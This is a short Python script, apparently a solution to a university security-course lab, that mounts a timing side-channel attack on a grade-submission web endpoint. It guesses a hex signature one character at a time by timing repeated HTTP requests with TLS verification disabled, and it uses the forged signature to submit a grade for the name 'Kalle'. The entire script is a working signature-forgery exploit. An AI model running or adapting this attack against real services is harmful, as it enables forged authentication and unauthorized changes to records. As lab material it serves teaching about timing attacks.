import requests
import time

def get_req(url, payload):
     return requests.get(url, params=payload, verify=False)

def req_time(url, payload):
    return get_req(url, payload).elapsed.total_seconds()

def timing_attack(name, grade):
    url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"
    sig = ""
    payload = {"name": name, "grade": grade, "signature": sig}
    for i in range(20):
        highest = 0.0
        charToAdd = ''
        for x in range(0, 16):
            char = hex(x)[2:]
            t_sign = sig + char
            payload["signature"] = t_sign
            low = min([req_time(url, payload) for x in range(12)])
            print("Character: " + char + " time: " + str(low))
            if low > highest:
                highest = low
                charToAdd = char
        sig = sig + charToAdd
        print(sig)

timing_attack("Kalle", 5)